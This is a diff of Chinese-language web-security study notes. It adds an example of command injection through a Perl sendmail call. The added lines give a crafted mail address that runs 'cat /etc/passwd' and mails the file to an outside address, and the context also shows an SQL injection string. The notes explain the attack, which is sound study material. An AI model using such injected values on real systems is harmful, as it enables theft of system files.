@@ -505,6 +505,10 @@ select * from K where name="404"--" password="123456";
 my $ad = $q->param('mailaddress');
 open(MALL,"| /user/sbin/sendmail $adr");
 ```
+攻击者以下面为邮箱地址
+
+`; cat /etc/passwd | mail hack@404mzk.com`;
+这样passwd文件内容就会发送过去邮箱.
 
 
 疑问:代理服务器和缓存服务器的区别?.
